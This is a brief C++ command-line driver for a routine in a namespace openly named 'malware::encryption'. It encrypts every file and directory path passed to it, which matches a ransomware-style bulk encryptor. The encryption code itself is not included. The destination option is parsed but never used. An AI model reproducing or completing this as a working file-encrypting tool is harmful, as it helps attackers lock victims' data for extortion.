/* driver file for encryption */
#include <iostream>
#include <string>
#include <vector>
#include "encryption.h"
using namespace malware::encryption;

static void show_usage(std::string name){
    std::cerr << "Usage: " << name << " <option(s)> SOURCES"
              << "Options:\n"
              << "\t-h,--help\t\tShow this help message\n"
              << "\t-d,--destination DESTINATION\tSpecify the destination path"
              << std::endl;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        show_usage(argv[0]);
        return 1;
    }
    std::vector<std::string> sources;
    std::string destination;
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            if (argv[i][1] == 'h' || argv[i][1] == 'H') {
                show_usage(argv[0]);
                return 0;
            } else if (argv[i][1] == 'd' || argv[i][1] == 'D') {
                destination = argv[i + 1];
                i++;
            } else {
                std::cerr << "Invalid option: " << argv[i] << std::endl;
                return 1;
            }
        } else {
            sources.push_back(argv[i]);
        }
    }
    for (auto source : sources) {
        if (source[source.size() - 1] == '/') {
            malware::encryption::encryptDirectory(source);
        } else {
            malware::encryption::encryptFile(source);
        }
    }
    return 0;
}